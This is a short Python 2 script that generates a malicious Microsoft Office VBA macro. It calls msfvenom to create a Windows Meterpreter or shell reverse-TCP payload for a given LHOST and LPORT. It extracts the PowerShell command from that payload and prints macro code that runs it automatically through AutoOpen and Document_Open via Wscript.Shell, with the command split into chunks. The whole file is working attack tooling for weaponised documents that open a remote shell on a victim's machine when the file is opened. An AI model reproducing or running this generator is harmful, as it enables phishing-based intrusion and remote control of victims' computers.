import subprocess
import re
import sys


if len(sys.argv) !=4:
	print "usage: ./gen_macro.py [LHOST] [LPORT] [payload]"
	print "payload options: [meterpreter] || [shell]"
	sys.exit(0)

if sys.argv[3]=="meterpreter":
	payload_arg="windows/meterpreter/reverse_tcp"
else:
	payload_arg="windows/shell_reverse_tcp"
print payload_arg

print "Generating MACRO: "+sys.argv[3]+" "+sys.argv[1]+" "+sys.argv[2]
payload = subprocess.check_output(['msfvenom', '-p',payload_arg,"LHOST="+sys.argv[1],"LPORT="+sys.argv[2],'-f','hta-psh'])
match = re.findall("powershell.*\"",payload)

pspayload = match[1][:-1]

print "Sub AutoOpen()"
print "	MyMacro"
print "End Sub"
print "Sub Document_Open()"
print "	MyMacro"
print "End Sub"
print "Sub MyMacro()"
print "Dim Str As String"
n = 50
print " Str = "+'"'+pspayload[0:n]+'"'
for i in range(50, len(pspayload), n):
	print " Str = Str + "+'"'+pspayload[i:i+n]+'"'
print "CreateObject(\"Wscript.Shell\").Run Str"
print "End Sub"
